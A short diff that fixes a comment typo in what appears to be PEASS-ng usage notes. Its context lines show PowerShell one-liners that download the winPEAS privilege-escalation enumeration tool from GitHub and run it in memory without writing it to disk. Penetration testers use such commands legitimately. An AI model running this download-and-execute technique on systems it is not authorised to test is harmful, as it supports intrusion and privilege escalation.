@@ -22,7 +22,7 @@ $url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany
 # One liner to download and execute winPEASany from memory in a PS shell
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
 
-# The cprevios cmd in 2 lines
+# The previous cmd in 2 lines
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
 [winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
 
